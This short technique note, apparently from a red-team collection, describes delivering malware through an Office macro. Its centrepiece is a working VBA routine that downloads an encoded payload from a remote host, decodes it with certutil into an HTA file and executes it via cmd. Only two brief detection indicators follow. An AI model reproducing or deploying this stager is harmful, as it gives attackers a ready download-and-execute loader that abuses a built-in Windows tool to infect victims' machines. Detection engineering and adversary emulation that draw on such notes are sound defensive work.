# Download execute a HTA via certutil

## Execution

1. ServerXMLHTTP to fetch the encoded payload
2. Store the payload as encoded.crt on disc
3. Run decode and run payload via certutil oneliner

```vb
    Sub DownloadAndExec()
        Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
        Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
        xHttp.Open "GET", "https://trusted.domain/encoded.crt", False
        xHttp.Send

        With bStrm
            .Type = 1 '//binary
            .Open
            .write xHttp.responseBody
            .savetofile "encoded.crt", 2 '//overwrite
        End With

        Shell ("cmd /c certutil -decode encoded.crt encoded.hta & start encoded.hta")
    End Sub
```

## Detection

* Base64 decoded
* Decoding of HTA on disc and running via cmd